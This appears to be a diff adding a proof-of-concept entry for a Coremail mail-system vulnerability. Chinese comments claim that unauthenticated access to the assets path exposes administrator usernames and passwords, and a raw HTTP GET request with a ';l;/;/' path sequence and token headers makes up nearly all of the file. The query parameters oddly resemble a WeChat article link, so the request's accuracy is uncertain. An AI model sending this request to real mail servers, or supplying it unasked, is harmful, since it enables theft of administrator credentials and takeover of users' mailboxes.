@@ -1,0 +1,9 @@
+# Coremail邮件系统assets未授权访问获取管理员账密
+# Coremail邮件系统assets存在未授权访问漏洞，攻击者可获取管理员账密从而登录邮箱。
+GET /coremail/common/assets/;l;/;/;/;/;/s?biz=Mzl3MTk4NTcyNw==&mid=2247485877&idx=1&sn=7e5f77db320ccf9013c0b7aa72626e68&chksm=eb3834e5dc4fbdf3a9529734de7e6958e1b7efabecd1c1b340c53c80299ff5c688bf6adaed61&scene=2&acid=80001467&bid=hd_tag_m8mv25z9 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25z9
+RM-PRO-Token: a229761117c6f7091270b70e98408d30
+RM-PRO-Time: 1742808515551
+User-Agent: curl/7.83.1
+
